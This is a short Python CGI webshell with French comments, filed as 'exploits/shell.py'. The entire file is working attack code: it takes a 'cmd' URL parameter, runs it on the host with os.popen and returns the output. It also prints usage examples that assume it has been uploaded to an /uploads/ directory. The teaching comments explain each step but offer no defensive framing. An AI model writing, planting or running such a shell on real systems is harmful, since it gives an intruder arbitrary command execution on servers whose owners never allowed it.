# exploits/shell.py

import os  # Le module pour interagir avec le système d'exploitation (ex: exécuter des commandes)
import cgi # Le module pour analyser les requêtes web et récupérer les paramètres de l'URL

# C'est une instruction pour le navigateur, lui disant que la réponse sera du texte pur.
print("Content-Type: text/plain")
print() # Une ligne vide est nécessaire pour séparer les en-têtes de la réponse.

try:
    # Récupère les données envoyées dans l'URL (par exemple, ce qui suit le "?")
    form = cgi.FieldStorage()
    
    # Cherche un paramètre nommé 'cmd' dans l'URL
    command = form.getvalue('cmd')

    # Si une commande a été trouvée...
    if command:
        print(f"--- Execution de la commande : {command} ---\n")
        
        # C'EST LA LIGNE MAGIQUE : exécute la commande sur le serveur
        stream = os.popen(command)
        
        # Lit le résultat de la commande et l'affiche
        output = stream.read()
        print(output)
    else:
        # Si aucune commande n'est passée, affiche un message d'aide
        print("Webshell actif. Vous pouvez executer une commande.")
        print("Exemple (Linux/macOS) : /uploads/shell.py?cmd=ls -la")
        print("Exemple (Windows)     : /uploads/shell.py?cmd=dir")

except Exception as e:
    print(f"Une erreur est survenue: {e}")
